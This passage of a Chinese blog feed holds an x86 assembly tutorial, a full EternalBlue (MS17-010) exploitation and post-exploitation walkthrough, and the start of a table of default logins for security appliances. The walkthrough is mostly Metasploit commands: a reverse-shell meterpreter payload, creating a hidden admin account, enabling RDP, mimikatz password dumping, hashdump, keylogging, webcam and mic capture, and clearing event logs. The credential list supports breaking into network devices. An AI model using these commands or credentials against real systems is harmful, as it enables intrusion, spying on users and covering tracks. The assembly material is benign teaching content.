；参数2</span><br><span class="line">00EE1854 68 30 7B EE 00 push 0EE7B30h ；参数1</span><br><span class="line">00EE1859 E8 E8 F7 FF FF call 00EE1046 ;printf</span><br><span class="line">00EE185E 83 C4 08 add esp,8 ；平衡堆栈</span><br><span class="line">00EE1861 EB DE jmp 00EE1841</span><br><span class="line">; while 循环</span><br><span class="line">int index &#x3D; 0;</span><br><span class="line">while (index &lt; 10)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d&quot;, index);</span><br><span class="line">index++;</span><br><span class="line">&#125;</span><br><span class="line">00EE1863 C7 45 EC 00 00 00 00 mov dword ptr [ebp-14h],0 ；int index &#x3D; 0</span><br><span class="line">00EE186A 83 7D EC 0A cmp dword ptr [ebp-14h],0Ah ; if index &gt;&#x3D; 10 循环结束</span><br><span class="line">00EE186E 7D 1C jge 00EE188C</span><br><span class="line">00EE1870 8B 45 EC mov eax,dword ptr [ebp-14h]</span><br><span class="line">07 定位关键代码</span><br><span class="line">通过字符串搜索</span><br><span class="line">通过API断点-》堆栈回溯</span><br><span class="line">00EE1873 50 push eax ;参数2</span><br><span class="line">00EE1874 68 30 7B EE 00 push 0EE7B30h ;参数1</span><br><span class="line">00EE1879 E8 C8 F7 FF FF call 00EE1046 ；printf</span><br><span class="line">00EE187E 83 C4 08 add esp,8</span><br><span class="line">00EE1881 8B 45 EC mov eax,dword ptr [ebp-14h] ；index ++</span><br><span class="line">00EE1884 83 C0 01 add eax,1</span><br><span class="line">00EE1887 89 45 EC mov dword ptr [ebp-14h],eax</span><br><span class="line">00EE188A EB DE jmp 00EE186A ;向上跳转</span><br><span class="line">index &#x3D; 0;</span><br><span class="line">do&#123;</span><br><span class="line">printf(&quot;%d&quot;, index);</span><br><span class="line">index++;</span><br><span class="line">&#125; while (index &lt; 10);</span><br><span class="line">00EE188C C7 45 EC 00 00 00 00 mov dword ptr [ebp-14h],0 ; index &#x3D;0;</span><br><span class="line">; 循环体</span><br><span class="line">00EE1893 8B 45 EC mov eax,dword ptr [ebp-14h]</span><br><span class="line">00EE1896 50 push eax ；参数2</span><br><span class="line">00EE1897 68 30 7B EE 00 push 0EE7B30h ；参数1</span><br><span class="line">00EE189C E8 A5 F7 FF FF call 00EE1046 ；printf</span><br><span class="line">00EE18A1 83 C4 08 add esp,8</span><br><span class="line">00EE18A4 8B 45 EC mov eax,dword ptr [ebp-14h] ;index ++</span><br><span class="line">00EE18A7 83 C0 01 add eax,1</span><br><span class="line">00EE18AA 89 45 EC mov dword ptr [ebp-14h],eax</span><br><span class="line">00EE18AD 83 7D EC 0A cmp dword ptr [ebp-14h],0Ah ;如果小于10继续循环</span><br><span class="line">00EE18B1 7C E0 jl 00EE1893</span><br><span class="line">00EE18B3 33 C0 xor eax,eax</span><br><span class="line">00EE18B5 5F pop edi</span><br><span class="line">00EE18B6 5E pop esi</span><br><span class="line">00EE18B7 5B pop ebx</span><br><span class="line">00EE18B8 81 C4 D8 00 00 00 add esp,0D8h</span><br><span class="line">00EE18BE 3B EC cmp ebp,esp</span><br><span class="line">00EE18C0 E8 5C F9 FF FF call 00EE1221</span><br><span class="line">00EE18C5 8B E5 mov esp,ebp</span><br><span class="line">00EE18C7 5D pop ebp</span><br><span class="line">00EE18C8 C3</span><br></pre></td></tr></table></figure><h1 id="汇编对应库"><a href="#汇编对应库" class="headerlink" title="汇编对应库"></a>汇编对应库</h1><table><thead><tr><th>C语言</th><th>汇编</th><th>描述</th></tr></thead><tbody><tr><td>#include &lt;stdio&gt;</td><td>include msvcrt.inc includelib msvcrt.lib</td><td>输入输出库</td></tr><tr><td>printf</td><td>crt_printf</td><td>格式化输出</td></tr><tr><td>scanf</td><td>crt_scanf</td><td>格式化输入</td></tr><tr><td>getchar</td><td>crt_getchar</td><td>获取一个字符</td></tr><tr><td>_getch</td><td>crt__getch</td><td>无回显获取一个字符</td></tr><tr><td>fopen</td><td>crt_fopen</td><td>打开文件</td></tr><tr><td>fwrite</td><td>crt_fwrite</td><td>写入文件</td></tr><tr><td>fclose</td><td>crt_fclose</td><td>关闭文件</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>C语言</th><th>汇编</th><th>描述</th></tr></thead><tbody><tr><td>#include &lt;stdlib.h&gt;</td><td>include msvcrt.inc include msvcrt.lib</td><td>输入输出库</td></tr><tr><td>system</td><td>crt_system</td><td>系统函数</td></tr><tr><td>malloc</td><td>crt_malloc</td><td>申请堆空间</td></tr><tr><td>free</td><td>crt_free</td><td>释放堆空间</td></tr><tr><td>exit</td><td>crt_exit</td><td>结束进程</td></tr><tr><td>srand</td><td>crt_srand</td><td>设置随机数种子</td></tr><tr><td>rand</td><td>crt_rand</td><td>生成随机数</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>Windows</th><th>汇编</th><th>描述</th></tr></thead><tbody><tr><td>GDI对象相关API</td><td>include gdi32.inc includelib gdi32.lib</td><td>GDI对象相关，比如：画笔，画刷</td></tr><tr><td>CreateDC</td><td>CreateDC</td><td>创建DC</td></tr><tr><td>CreatePen</td><td>CreatePen</td><td>创建画笔</td></tr></tbody></table><table><thead><tr><th>Windows</th><th>汇编</th><th>描述</th></tr></thead><tbody><tr><td>网络相关</td><td>include wsock32.inc includelib wsock32.lib</td><td>内核对象相关，比如：进程线程</td></tr><tr><td>socket</td><td>socket</td><td>创建套接字</td></tr><tr><td>bind</td><td>bind</td><td>绑定套接字</td></tr></tbody></table><h1 id="汇编数据类型"><a href="#汇编数据类型" class="headerlink" title="汇编数据类型"></a>汇编数据类型</h1><table><thead><tr><th>名称</th><th>表示方式</th><th>缩写</th><th>长度（字节）</th></tr></thead><tbody><tr><td>字节</td><td>byte</td><td>db</td><td>1</td></tr><tr><td>字</td><td>word</td><td>dw</td><td>2</td></tr><tr><td>双字</td><td>dword</td><td>dd</td><td>4</td></tr><tr><td>三字</td><td>fword</td><td>df</td><td>6</td></tr><tr><td>四字</td><td>qword</td><td>dq</td><td>8</td></tr><tr><td>十字节BCD码</td><td>tbyte</td><td>dt</td><td>10</td></tr><tr><td>有符号字节</td><td>sbyte</td><td></td><td>1</td></tr><tr><td>有符号字</td><td>sword</td><td></td><td>2</td></tr><tr><td>有符号双字节</td><td>sdword</td><td></td><td>4</td></tr><tr><td>单精度浮点数</td><td>real4</td><td></td><td>4</td></tr><tr><td>双精度浮点数</td><td>real8</td><td></td><td>8</td></tr><tr><td>10字节浮点数</td><td>real10</td><td></td><td>10</td></tr></tbody></table><h1 id="混合编程"><a href="#混合编程" class="headerlink" title="混合编程"></a>混合编程</h1><h2 id="x32混合编程"><a href="#x32混合编程" class="headerlink" title="x32混合编程"></a>x32混合编程</h2><h3 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span>  a;</span><br><span class="line">   <span class="comment">// 内联汇编有两种方式</span></span><br><span class="line"><span class="comment">// 行内联汇编</span></span><br><span class="line">_asm push <span class="number">0</span></span><br><span class="line">_asm pop eax</span><br><span class="line"></span><br><span class="line"><span class="comment">// 块内联汇编</span></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax,<span class="number">100</span></span><br><span class="line">add eax,<span class="number">200</span></span><br><span class="line">mov [a],eax</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌入机器指令</span></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">_emit <span class="number">0x6A</span>;<span class="comment">//push 0</span></span><br><span class="line">_emit <span class="number">0x00</span>;</span><br><span class="line">_emit <span class="number">0x58</span>; <span class="comment">// pop eax</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x64混合编程"><a href="#x64混合编程" class="headerlink" title="x64混合编程"></a>x64混合编程</h2><p>使用.asm进行外联汇编</p><p>替换vs的编译器</p><h3 id="使用外联汇编"><a href="#使用外联汇编" class="headerlink" title="使用外联汇编"></a>使用外联汇编</h3><h4 id="1-添加-asm文件"><a href="#1-添加-asm文件" class="headerlink" title="1.添加.asm文件"></a>1.添加.asm文件</h4><p>​    asm文件中写入需要的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">;参数1 rcx 参数2 rdx 参数3 r8 参数4 r9</span><br><span class="line">;[esp]返回地址</span><br><span class="line">;[esp+4]参数1</span><br><span class="line">.code</span><br><span class="line">AddFun proc</span><br><span class="line">xor rax,rax</span><br><span class="line">add rax,rcx</span><br><span class="line">add rax,rdx</span><br><span class="line">add rax,r8</span><br><span class="line">add rax,r9</span><br><span class="line">ret</span><br><span class="line">AddFun endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="2，添加汇编编译器"><a href="#2，添加汇编编译器" class="headerlink" title="2，添加汇编编译器"></a>2，添加汇编编译器</h3><p>​    右击工程-生成依赖项-生成自定义-勾选masm(.targets,.props)项-确定</p><h3 id="3-让asm文件加入连接选项"><a href="#3-让asm文件加入连接选项" class="headerlink" title="3.让asm文件加入连接选项"></a>3.让asm文件加入连接选项</h3><p>​    右击-属性页-常规</p><p>​        -从生成中排除-否</p><p>​        -项类型-Microsoft Macro Assembler</p><p>​        点击确定</p><h3 id="4-C-使用汇编函数"><a href="#4-C-使用汇编函数" class="headerlink" title="4.C++使用汇编函数"></a>4.C++使用汇编函数</h3><p>​    </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">AddFun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c,<span class="keyword">int</span> d)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x = AddFun(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="OPCODE"><a href="#OPCODE" class="headerlink" title="OPCODE"></a>OPCODE</h1><h2 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h2><table><thead><tr><th>前缀</th><th>代码</th><th>构造模式</th><th>SIB</th><th>位移</th><th>立即数</th></tr></thead><tbody><tr><td>Prefixes</td><td>Code</td><td>ModR/M</td><td>SIB</td><td>Displacemen</td><td>lmmediate</td></tr></tbody></table><h3 id="前缀指令"><a href="#前缀指令" class="headerlink" title="前缀指令"></a>前缀指令</h3><p>前缀（Prefixes）的大小为1Byte，用于描述指令的前缀情况，他们可以被划分为5个集合：</p><p>66                                                                             -切换操作数大小</p><p>67                                                                             -切换地址大小（切换寻址模式）</p><p>F2/F3                                                                        -重复操作前缀</p><p>2E/36/3E/26/64/65                                                -修改默认段 FO 锁定前缀</p><p>注意：</p><p>“切换”的意思是将其在两种状态间来回转换，而并非特指某种状态将默认段修改为其他段的操作被称之为“修改默认段”</p><p>一个OpCode可能会有几个前缀，并每个类型只能同时出现一个，最多能有4个前缀。</p><p>如果有多个前缀，那么它们的顺序可以打乱</p><p>如果前缀不能对随它之后的 Op Code起作用，那么它就会被忽略</p><h3 id="CODE域"><a href="#CODE域" class="headerlink" title="CODE域"></a>CODE域</h3><p>Code域是指令的必须存在的部分，他携带者一下信息</p><p>​    1.指令的助记符名称</p><p>​    2.指令的操作数个数</p><p>​    3.指令的操作数类型</p><p>​    4.指令的操作数大小</p><p>​    5.指令是否存在ModR/M域</p><h3 id="MODR-M域"><a href="#MODR-M域" class="headerlink" title="MODR/M域"></a>MODR/M域</h3><p>ModR/M域保存着指令的比较复杂的寻址方式。它携带者以下信息</p><p>​    1.操作数名称（寄存器，内存地址）</p><p>​    2.是否存在SIB域</p><p>​    3.是否存在相对偏移</p><p>ModR/M域占一个字节，可以将这一个字节拆成一下格式</p><p>​    89 D8                            mov eax,ebx</p><p>​                                    D8=11011000</p><p>​                                    Mod     Reg     R/M</p><p>​                                    11         011     000</p><p>解析13个字节的OPCODE</p><p>F026C7 84 91 AA000000 11000000 </p><p>LOCK mov dword ptr ES: [edx*4 + ecx + 0xAA], 0x11</p><p>同操作码，不同指令</p><p>•83C0 01 ADD EAX,1</p><p>•83C8 01 OR EAX,1</p><p>•83D0 01 ADC EAX,1</p><p>•83D8 01 SBB EAX,1</p>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 汇编 </tag>
            
            <tag> x86 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永痕之蓝漏洞利用及后渗透</title>
      <link href="2020/12/05/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/"/>
      <url>2020/12/05/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><ul><li>永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对<strong>SMB服务</strong>进行攻击的漏洞，该漏洞导致攻击者在目标系统上<strong>可以执行任意代码</strong>。</li><li>注:SMB服务的作用:该服务器在windows与UNIX系列OS之间搭建起一座桥梁，让两者的资源可互通有无。</li></ul><h2 id="漏洞原理代码详解"><a href="#漏洞原理代码详解" class="headerlink" title="漏洞原理代码详解"></a>漏洞原理代码详解</h2><p><strong>下面两篇文章从实际代码详细分析了漏洞原理，想要从代码详细理解漏洞的同学可以点击查看</strong></p><ul><li><p><a href="http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772">http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</a></p></li><li><p><a href="https://blog.csdn.net/qq_27446553/article/details/73480807">https://blog.csdn.net/qq_27446553/article/details/73480807</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>首先我们需要准备一台kali攻击机，IP:172.22.163.97和一台开放445端口有永恒之蓝漏洞的win7虚拟机,IP:172.22.162.210</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集的方法有很多，我们可以使用nmap，nc等来获取被攻击机的一些版本信息，我们也可以使用kali的</p><p>metasploit</p><p>中的扫描模块。</p><h2 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h2><p>在kali终端中输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="http://www.c-hasel.cn/img/ms17010/msf.png" alt="img"></p></li></ul><ol><li><p>搜索漏洞模块</p><p>在kali终端输入</p></li></ol><p>   bash</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p>   <img src="http://www.c-hasel.cn/img/ms17010/search.png" alt="img"></p><ol start="2"><li>加载扫描模块</li></ol><p>   bash</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br></pre></td></tr></table></figure><p>   <img src="http://www.c-hasel.cn/img/ms17010/scanner.png" alt="img"></p><p>   输入要扫描的IP</p><p>   bash</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 172.22.162.210</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>   扫描结果显示该主机很容易受到ms17-010的攻击</p><p>   <img src="http://www.c-hasel.cn/img/ms17010/rhosts.png" alt="img"></p><p>   如果要进行全网段扫描可以在设置目标的时候输入</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 网段&#x2F;掩码位数</span><br></pre></td></tr></table></figure><p>   ，再设置线程</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set threads 100</span><br></pre></td></tr></table></figure><p>   就可以进行全网段扫描了。</p><ol start="3"><li>使用攻击模块</li></ol><p>   bash</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set rhosts 172.22.162.210</span><br><span class="line">set lhost 172.22.163.97</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>   选择攻击模块时要注意选择合适的版本，有些版本适用于win8以上</p><ul><li><code>set payload</code>:设置payload，这里用<code>set payload windows/x64/meterpreter/reverse_tcp</code><br>因为目标主机是64位主机，所以我们要用到的payload为windows x64,要选用其他payload可以<strong>使用show payloads查看适合要攻击的目标主机的payload</strong></li><li><code>show options</code>:使用该命令会列出使用当前模块所需要配置的参数</li><li><code>set rhosts</code>:目标主机地址:该命令会设置好需要攻击的目标主机地址</li><li><code>set lhost</code>:攻击机地址:该命令设置攻击机的地址，是目标主机回连至攻击机</li><li><code>set lport</code>:回连的端口:该命令会设置主机回连至攻击机的端口，默认为4444</li><li><code>run</code>:开始攻击</li></ul><p><strong>攻击成功后攻击机和目标主机之间会建立一个连接，得到一个meterpreter回话</strong><br><a href="http://www.c-hasel.cn/img/ms17010/run.png"><img src="http://www.c-hasel.cn/img/ms17010/run.png" alt="img"></a><br><a href="http://www.c-hasel.cn/img/ms17010/meter.png"><img src="http://www.c-hasel.cn/img/ms17010/meter.png" alt="img"></a></p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><ol><li>获取shell(windwos主机的cmd)<br><a href="http://www.c-hasel.cn/img/ms17010/shell.png"><img src="http://www.c-hasel.cn/img/ms17010/shell.png" alt="img"></a><br>如果发现乱码输入<code>chcp 65001</code>即可改变编码</li><li>提权<br>当我们获取了shell后权限是很低的，这个时候我们就新建一个名为test的管理员，密码为123456<br><a href="http://www.c-hasel.cn/img/ms17010/admin.png"><img src="http://www.c-hasel.cn/img/ms17010/admin.png" alt="img"></a></li><li>远程连接<br>打开3389端口方便我们远程连接这台主机<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br><a href="http://www.c-hasel.cn/img/ms17010/3389.png"><img src="http://www.c-hasel.cn/img/ms17010/3389.png" alt="img"></a><br>新建一个终端窗口输入<code>rdesktop 172.22.162.210</code></li></ol><ul><li><code>-u</code>:指定用户名</li><li><code>-p</code>:指定密码</li><li><code>-f</code>:全屏显示<br>更多参数输入<code>rdesktop --help</code></li></ul><p>选择其他用户登录我们之前创建的test用户就可以图形化操作了<br><a href="http://www.c-hasel.cn/img/ms17010/rdesktop.png"><img src="http://www.c-hasel.cn/img/ms17010/rdesktop.png" alt="img"></a><br><a href="http://www.c-hasel.cn/img/ms17010/rdesk.png"><img src="http://www.c-hasel.cn/img/ms17010/rdesk.png" alt="img"></a></p><p>该永恒之蓝模块只适用于64位win7和server2008<br>要是现在有一台存在漏洞的32位2003系统该怎么办<br>这里我们就需要用到永恒之蓝的另一个模块<br><code>use exploit/windows/smb/ms17_010_psexec</code><br>这个模块支持server2003这样的老系统并支持32位系统<br><code>set payload windows/meterpreter/bind_tcp</code></p><h1 id="msf后渗透"><a href="#msf后渗透" class="headerlink" title="msf后渗透"></a>msf后渗透</h1><p>返回Metasploit继续操作<br>在之前的shell界面输入exit<br><a href="http://www.c-hasel.cn/img/ms17010/exit.png"><img src="http://www.c-hasel.cn/img/ms17010/exit.png" alt="img"></a></p><ul><li>查看用户密码<ol><li>加载mimikatz:<code>laod mimikatz</code></li><li>获取明文密码:<code>kerberos</code>，如果开机没使用密码kerberos是抓取不到的，也可以用<code>wdigest</code></li></ol></li></ul><p><a href="http://www.c-hasel.cn/img/ms17010/mimikatz.png"><img src="http://www.c-hasel.cn/img/ms17010/mimikatz.png" alt="img"></a><br><strong>如果在提权之前用kerberos获取到内存中的管理员密码可以减少提权这一步哦</strong></p><ul><li><code>getuid</code>查看当前用户</li></ul><p><a href="http://www.c-hasel.cn/img/ms17010/uid.png"><img src="http://www.c-hasel.cn/img/ms17010/uid.png" alt="img"></a></p><ul><li><code>sysinfo</code>查看系统信息</li></ul><p><a href="http://www.c-hasel.cn/img/ms17010/sys.png"><img src="http://www.c-hasel.cn/img/ms17010/sys.png" alt="img"></a></p><ul><li><code>ifconfig</code>查看网卡信息</li></ul><p><a href="http://www.c-hasel.cn/img/ms17010/network.png"><img src="http://www.c-hasel.cn/img/ms17010/network.png" alt="img"></a></p><ul><li><code>ps</code>查看任务管理器</li></ul><p><a href="http://www.c-hasel.cn/img/ms17010/ps.png"><img src="http://www.c-hasel.cn/img/ms17010/ps.png" alt="img"></a></p><ul><li><code>hashdump</code>查看用户hash</li></ul><p><a href="http://www.c-hasel.cn/img/ms17010/hash.png"><img src="http://www.c-hasel.cn/img/ms17010/hash.png" alt="img"></a></p><ul><li>监听键盘记录<br>首先我们要迁移到对应用户的进程上<br>先用ps查看下进程</li></ul><p><a href="http://www.c-hasel.cn/img/ms17010/ps2.png"><img src="http://www.c-hasel.cn/img/ms17010/ps2.png" alt="img"></a><br>我们发现administrator的进程为1968<br><code>migrate 1968</code><br>将进程迁移到administrator进程上<br><code>getuid</code>查看当前用户已经切换到了administrator<br><a href="http://www.c-hasel.cn/img/ms17010/1986.png"><img src="http://www.c-hasel.cn/img/ms17010/1986.png" alt="img"></a><br><code>keyscan_start</code><br>开始监听键盘记录<br>这时我们模拟一下登录qq邮箱<br><code>keyscan_dump</code><br>查看监听的键盘记录<br><a href="http://www.c-hasel.cn/img/ms17010/key.png"><img src="http://www.c-hasel.cn/img/ms17010/key.png" alt="img"></a><br>通过监听键盘记录发现主机访问了qq邮箱输入了qq号:te退格退格123456和密码:test123tabtest132<br><code>keyscan_stop</code><br>停止键盘监听</p><ul><li><code>uictl</code>键盘/鼠标开关<strong>必须要32位主机</strong><ul><li><code>uictl enable/disable keyboard</code>开启或禁用键盘</li><li><code>uictl enable/disable mouse</code>开启或禁用鼠标</li><li><code>uictl enable/disable all</code>开启或禁用键盘鼠标</li></ul></li><li><code>webcam</code>查看摄像头<ul><li><code>webcam_list</code>:查看摄像头列表</li><li><code>webcam_snap</code>:通过摄像头拍照</li><li><code>webcam_stream</code>:通过摄像头开启视频<br>由于我是虚拟机，检测不到摄像头驱动。</li></ul></li><li><code>execute</code>执行文件<ul><li><code>execute -f</code>执行制定文件</li><li><code>execute -H -i -f cmd.exe</code>创建新的cmd，-H不可见，-i交互</li></ul></li></ul><p><a href="http://www.c-hasel.cn/img/ms17010/execute.png"><img src="http://www.c-hasel.cn/img/ms17010/execute.png" alt="img"></a></p><ul><li><code>screenshot</code>:截屏</li><li><code>screenshare</code>:查看实时共享屏幕左边为攻击机，右边为被攻击主机</li></ul><p><video class="dplayer-video dplayer-video-current" webkit-playsinline="" playsinline="" preload="metadata" src="http://www.c-hasel.cn/img/ms17010/share.mp4" style="box-sizing: content-box; display: block; width: 900px; height: 374.281px;"></video></p><p> 00:20 / 00:20</p><p>速度</p><p>洗脑循环</p><p>00:17</p><p>快退 10 秒</p><ul><li><code>record_mic</code>:记录声音</li><li><code>clearev</code>:清理日志</li></ul><p><strong>严重声明</strong>：本站内容仅适于网络安全技术和信息安全爱好者学习研究使用，禁止用于非法用途，学习中请遵循国家相关法律法规，共同维护网络安全</p><p>注明：来自<a href="http://www.c-hasel.cn/">Corey’s Blog</a>！</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的网络安全设备及默认口令</title>
      <link href="2020/12/05/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%8F%8A%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
      <url>2020/12/05/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%8F%8A%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>设备</th><th>默认账号</th><th>默认密码</th></tr></thead><tbody><tr><td>深信服产品</td><td>sangfor</td><td>sangfor sangfor@2018 sangfor@2019</td></tr><tr><td>深信服科技 AD</td><td></td><td>dlanrecover</td></tr><tr><td>深信服负载均衡 AD 3.6</td><td>admin</td><td>admin</td></tr><tr><td>深信服WAC(WBS V2.6)</td><td>admin</td><td>admin</td></tr><tr><td>深信服VPN</td><td>Admin</td><td>Admin</td></tr><tr><td>深信服ipsec-VPn(SSL 5.5)</td><td>Admin</td><td>Admin</td></tr><tr><td>深信服AC6.0</td><td>admin</td><td>admin</td></tr><tr><td>SANGFOR防火墙</td><td>admin</td><td>sangfor</td></tr><tr><td>深信服AF(NGAF V2.2)</td><td>admin</td><td>sangfor</td></tr><tr><td>深信服NGAF下一代防火墙(NGAF V4.3)</td><td>admin</td><td>admin</td></tr><tr><td>深信服上网行为设备数据中心</td><td>Admin</td><td>密码为空</td></tr><tr><td>SANGFOR_AD_V5.1</td><td>admin</td><td>admin</td></tr><tr><td>天阗入侵检测与管理系统 V7.0</td><td>Admin</td><td>venus70</td></tr><tr><td>Audit</td><td></td><td></td></tr><tr><td>adm</td><td></td><td></td></tr><tr><td>天阗入侵检测与管理系统 V6.0</td><td>Admin</td><td>venus60</td></tr><tr><td>Audit</td><td></td><td></td></tr><tr><td>adm</td><td></td><td></td></tr><tr><td>网御WAF集中控制中心(V3.0R5.0)</td><td>admin</td><td>leadsec.waf</td></tr><tr><td>audit</td><td></td><td></td></tr><tr><td>adm</td><td></td><td></td></tr><tr><td>联想网御</td><td>administrator</td><td>administrator</td></tr><tr><td>网御事件服务器</td><td>admin</td><td>admin123</td></tr><tr><td>联想网御防火墙PowerV</td><td>administrator</td><td>administrator</td></tr><tr><td>联想网御入侵检测系统</td><td>lenovo</td><td>default</td></tr><tr><td>网络卫士入侵检测系统</td><td>admin</td><td>talent</td></tr><tr><td>网御入侵检测系统V3.2.72.0</td><td>adm</td><td>leadsec32</td></tr><tr><td>admin</td><td></td><td></td></tr><tr><td>联想网御入侵检测系统V3.2.72.0</td><td>root</td><td>111111</td></tr><tr><td>admin</td><td>admin123</td><td></td></tr><tr><td>科来网络回溯分析系统</td><td>csadmin</td><td>colasoft</td></tr><tr><td>中控考勤机web3.0</td><td>administrator</td><td>123456</td></tr><tr><td>H3C iMC</td><td>admin</td><td>admin</td></tr><tr><td>H3C SecPath系列</td><td>admin</td><td>admin</td></tr><tr><td>H3C 